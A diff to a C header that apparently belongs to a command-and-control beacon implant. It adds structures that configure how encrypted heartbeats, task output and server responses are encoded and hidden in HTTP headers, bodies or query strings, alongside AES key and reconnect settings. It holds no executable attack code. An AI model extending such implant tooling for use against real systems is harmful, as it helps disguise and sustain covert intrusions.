@@ -2,6 +2,32 @@
 
 #include "beacon_common.h"
 
+/* HTTP transform 中的单个数据位置/编码规则 */
+typedef struct HttpDataTransform {
+    UINT8 present;              /* 0=absent, 1=present */
+    UINT8 location;             /* 0=none, 1=body, 2=header, 3=query */
+    UINT8 encoding;             /* 0=none, 1=raw, 2=base64, 3=base64url */
+    UINT8 output_mode;          /* 0=none, 1=binary, 2=print */
+    CHAR name[64];              /* header/query 名称 */
+    CHAR prefix[128];           /* 编码后前缀 */
+    CHAR suffix[128];           /* 编码后后缀 */
+} HttpDataTransform;
+
+/* 一个 HTTP method 的 wire transform */
+typedef struct HttpMethodTransform {
+    HttpDataTransform metadata;      /* 加密 heartbeat */
+    HttpDataTransform stage_output;  /* 加密结果 */
+    HttpDataTransform server_output; /* 加密任务响应 */
+} HttpMethodTransform;
+
+/* HTTP transform TLV 解析结果 */
+typedef struct HttpTransformConfig {
+    UINT8 present;              /* 是否出现过 CfgHTTPTransform */
+    UINT16 version;             /* 当前仅支持 version=1 */
+    HttpMethodTransform get;
+    HttpMethodTransform post;
+} HttpTransformConfig;
+
 /* HTTP 传输配置 */
 typedef struct HttpProfile {
     CHAR method[16];            /* HTTP 方法（GET/POST） */
@@ -9,8 +35,6 @@ typedef struct HttpProfile {
     CHAR uri[256];              /* 完整 URI */
     CHAR host_header[256];      /* Host 头 */
     CHAR response_headers[1024];/* 自定义响应头 */
-    CHAR hb_header[64];         /* 心跳使用的 header 名 */
-    CHAR hb_prefix[64];         /* 心跳 header 值前缀 */
     CHAR user_agent[256];       /* User-Agent */
     CHAR content_type[128];     /* Content-Type */
     CHAR encrypt_key[128];      /* AES 加密密钥（hex 编码） */
@@ -20,6 +44,7 @@ typedef struct HttpProfile {
     INT x_forwarded_for;        /* 是否添加 X-Forwarded-For 头 */
     INT reconnect_count;        /* 重连次数上限 */
     INT reconnect_time_ms;      /* 重连间隔（ms） */
+    HttpTransformConfig transform; /* 新版 HTTP wire transform */
 } HttpProfile;
 
 /* external TCP 回连配置 */
